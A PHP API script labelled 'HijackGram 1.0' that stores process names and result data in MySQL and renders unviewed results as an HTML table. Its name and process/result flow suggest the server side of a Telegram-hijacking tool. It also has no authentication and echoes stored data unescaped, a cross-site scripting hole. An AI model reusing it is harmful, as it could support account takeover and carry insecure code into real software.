<?php
/*
	HijackGram 1.0
	API
*/
if(file_exists('config.json'))
	$config = json_decode(file_get_contents('config.json'));
else
	die('Config file not found');

$bdd = new PDO('mysql:host='.$config->database->_host.";dbname=".$config->database->_dbname,$config->database->_username,$config->database->_password);

if(isset($_GET['load']) && $_GET['load'] != "")
{
	$update = $bdd->prepare("UPDATE utilisateurs SET load_telegram = '1' WHERE 1");
	$update->execute();
	exit();
}
elseif(isset($_GET['status']) && $_GET['status'] != "")
{
	$select = $bdd->prepare("SELECT load_telegram FROM utilisateurs WHERE username = 'root'");
	$select->execute();
	$fetch = $select->fetch();
	if($fetch['load_telegram'] != '')
		echo $fetch['load_telegram'];
	else
		echo '0';
	exit();
}
elseif(isset($_GET['process']) && $_GET['process'] != "")
{
	$process = $_GET['process'];
	if(isset($_GET['cmd']) && $_GET['cmd'] != '')
		$cmd = $_GET['cmd'];
	else
		exit();
	if($cmd == "insert")
	{
		$select = $bdd->prepare("SELECT process_name FROM process WHERE process_actif = '1' ORDER BY id DESC LIMIT 1");
		$select->execute();
		if($select->rowCount() < 1)
		{
			$insert = $bdd->prepare("INSERT INTO process(process_name) VALUES(:process_name)");
			$insert->bindParam(':process_name', $process);
			$insert->execute();
		}
		exit();
	}
	elseif($cmd == "update")
	{
		$update = $bdd->prepare("UPDATE process SET process_actif = '0' WHERE process_name = :process_name ORDER BY id DESC LIMIT 1");
		$update->bindParam(':process_name', $process);
		$update->execute();
		exit();
	}
	elseif($cmd == "last")
	{
		$select = $bdd->prepare("SELECT process_name FROM process WHERE process_actif = '1' ORDER BY id DESC LIMIT 1");
		$select->execute();
		if($select->rowCount() > 0)
		{	
			$fetch = $select->fetch(PDO::FETCH_ASSOC);
			echo json_encode($fetch, JSON_PRETTY_PRINT);
			exit();
		}
	}

}
elseif(isset($_GET['result']) && $_GET['result'] != '')
{
	$result = $_GET['result'];
	if(isset($_GET['cmd']) && $_GET['cmd'] != '')
		$cmd = $_GET['cmd'];
	else
		exit();
	if(isset($_GET['process_name']) && $_GET['process_name'] != '')
		$process = $_GET['process_name'];
	else
		exit();
	if($cmd == "insert")
	{
		$icon = $config->icon->$process;
		$insert = $bdd->prepare("INSERT INTO result(process_name,result_data,icon) VALUES(:process_name,:result_data,:icon)");
		$insert->bindParam(':process_name', $process);
		$insert->bindParam(':result_data', $result);
		$insert->bindParam(':icon', $icon);
		$insert->execute();
	}
	elseif($cmd == "get")
	{
		$select = $bdd->prepare("SELECT * FROM result WHERE result_view = '0'");
		$select->bindParam(':process_name',  $process);
		$select->execute();
		if($select->rowCount() > 0)
		{
			echo '<table class="ui table"><tbody>';
			while($fetch = $select->fetch(PDO::FETCH_ASSOC))
			{
				echo '<tr><td class="collapsing"><i class="'.$fetch['icon'].' icon"></i>'.$fetch['process_name'].'</td><td>'.$fetch['result_data'].'</td></tr>';
			}
			echo '</tbody></table>';
			exit();
		}
	}
}